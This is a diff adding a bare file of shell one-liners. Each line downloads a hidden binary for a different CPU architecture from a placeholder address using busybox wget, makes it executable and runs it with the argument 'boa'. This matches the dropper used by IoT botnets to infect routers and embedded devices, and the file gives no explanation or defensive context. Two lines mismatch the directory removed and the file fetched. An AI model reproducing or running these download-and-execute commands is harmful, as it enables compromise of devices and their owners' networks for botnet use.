@@ -1,0 +1,11 @@
+cd /tmp ; rm -rf x86_64 ; /bin/busybox wget http://0.0.0.0/.Sx86_64 ; chmod 777 .Sx86_64 ; ./.Sx86_64 boa ;
+cd /tmp ; rm -rf mpsl ; /bin/busybox wget http://0.0.0.0/.Smpsl ; chmod 777 .Smpsl ; ./.Smpsl boa ;
+cd /tmp ; rm -rf mips ; /bin/busybox wget http://0.0.0.0/.Smips ; chmod 777 .Smips ; ./.Smips boa ; 
+cd /tmp ; rm -rf arm5 ; /bin/busybox wget http://0.0.0.0/.Sarm4 ; chmod 777 .Sarm4 ; ./.Sarm4 boa ;
+cd /tmp ; rm -rf arm4 ; /bin/busybox wget http://0.0.0.0/.Sarm5 ; chmod 777 .Sarm5 ; ./.Sarm5 boa ;
+cd /tmp ; rm -rf arm6 ; /bin/busybox wget http://0.0.0.0/.Sarm6 ; chmod 777 .Sarm6 ; ./.Sarm6 boa ;
+cd /tmp ; rm -rf arm7 ; /bin/busybox wget http://0.0.0.0/.Sarm7 ; chmod 777 .Sarm7 ; ./.Sarm7 boa ; 
+cd /tmp ; rm -rf m68k ; /bin/busybox wget http://0.0.0.0/.Sm68k ; chmod 777 .Sm68k ; ./.Sm68k boa ;
+cd /tmp ; rm -rf x86 ; /bin/busybox wget http://0.0.0.0/.Sx86 ; chmod 777 .Sx86 ; ./.Sx86 boa ;
+cd /tmp ; rm -rf spc ; /bin/busybox wget http://0.0.0.0/.Sspc ; chmod 777 .Sspc ; ./.Sspc boa ;
+cd /tmp ; rm -rf ppc ; /bin/busybox wget http://0.0.0.0/.Sppc ; chmod 777 .Sppc ; ./.Sppc boa ;
